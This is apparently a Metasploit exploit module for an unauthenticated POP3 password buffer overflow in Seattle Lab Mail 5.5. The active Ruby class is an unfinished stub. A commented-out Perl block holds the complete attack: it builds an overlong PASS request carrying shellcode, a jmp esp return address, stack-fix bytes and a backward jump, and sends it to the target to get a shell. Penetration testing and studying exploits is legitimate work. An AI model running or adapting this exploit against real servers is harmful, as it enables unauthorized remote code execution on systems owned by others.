require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Seattle Lab Mail 5.5 POP3 Buffer Overflow',
			'Description'    => %q{
				There exists an unauthenticated buffer overflow
				vulnerability in the POP3 server of Seattle Lab Mail 5.5
				when sending a password with excessive length.

				Successful exploitation should not crash either the service
				or the server; however, after initial use the port cannot be
				reused for successive exploitation until the service has
				been restarted. Consider using a command execution payload
				following the bind shell to restart the service if you need
				to reuse the same port.

				The overflow appears to occur in the debugging/error
				reporting section of the slmail.exe executable, and there
				are multiple offsets that will lead to successful
				exploitation. This exploit uses 2606, the offset that
				creates the smallest overall payload. The other offset is
				4654.

				The return address is overwritten with a "jmp esp" call from
				the application library SLMFC.DLL found in
				%SYSTEM%\system32\. This return address works against all
				version of Windows and service packs.

				The last modification date on the library is dated 06/02/99.
				Assuming that the code where the overflow occurs has not
				changed in some time, prior version of SLMail may also be
				vulnerable with this exploit. The author has not been able
				to acquire older versions of SLMail for testing purposes.
				Please let us know if you were able to get this exploit
				working against other SLMail versions.
					
			},
			'Author'         => [ 'Stinko' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '12002'],
					[ 'BID', '7519'],
					[ 'MIL', '57'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x0a\x0d\x20",
					'MinNops'  => 100,

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'May 07 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::seattlelab_mail_55;
use base "Msf::Exploit";
use strict;

my $advanced = {};
my $info =
  {
	'Name'    => 'Seattle Lab Mail 5.5 POP3 Buffer Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'Stinko', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 110],
	  },

	'Payload' =>
	  {
		'Space'          => 600,
		'BadChars'       => "\x00\x0a\x0d\x20",
		'MinNops'        => 100,
		'Keys'           => ['+ws2ord'],
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
        There exists an unauthenticated buffer overflow vulnerability
        in the POP3 server of Seattle Lab Mail 5.5 when sending a password
        with excessive length.

        Successful exploitation should not crash either the
        service or the server; however, after initial use the
        port cannot be reused for successive exploitation until
        the service has been restarted. Consider using a command
        execution payload following the bind shell to restart
        the service if you need to reuse the same port.

        The overflow appears to occur in the debugging/error reporting
        section of the slmail.exe executable, and there are multiple
        offsets that will lead to successful exploitation. This exploit
        uses 2606, the offset that creates the smallest overall payload.
        The other offset is 4654.

        The return address is overwritten with a "jmp esp" call from the
        application library SLMFC.DLL found in %SYSTEM%\\system32\\. This
        return address works against all version of Windows and service packs.

        The last modification date on the library is dated 06/02/99. Assuming
        that the code where the overflow occurs has not changed in some time,
        prior version of SLMail may also be vulnerable with this exploit. The
        author has not been able to acquire older versions of SLMail for
        testing purposes. Please let us know if you were able to get this
        exploit working against other SLMail versions.		
}),

	'Refs'  =>
	  [
		['OSVDB', '12002'],
		['BID', '7519'],
		['MIL', '57'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Windows NT/2000/XP/2003 (SLMail 5.5)', 2606, 0x5f4a358f],
	  ],

	'Keys' => ['pop3'],

	'DisclosureDate' => 'May 07 2003',

  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[$target_idx];
	my $result;

	my $request = "PASS " . Pex::Text::EnglishText($target->[1] - length($shellcode));
	$request .= $shellcode;
	$request .= pack("V", $target->[2]);
	$request .= "\x81\xc4\xff\xef\xff\xff\x44"; # Fix the stack
	$request .= "\xe9\xcb\xfd\xff\xff";         # Go back 560 bytes
	$request .= Pex::Text::EnglishText(512);    # Oh look. Cruft.
	$request .= "\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp esp at 0x%.8x...", $target->[2]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$result = $s->Recv(-1, 5);
	if ($result !~ /^\+OK POP3 server (.*) ready/) {
		$self->PrintLine('[*] POP3 server does not appear to be running.');
		return;
	}

	$s->Send("USER metasploit\r\n");

	$result = $s->Recv(-1, 5);
	if ($result !~ /^\+OK (.*) welcome here$/) {
		$self->PrintLine('[*] POP3 server rejects username.');
	}

	$self->PrintLine('[*] Everything looks good, starting attack...');

	$s->Send($request);
	$self->Handler($s);
	$s->Close();
	return;
}


=end


end
end	
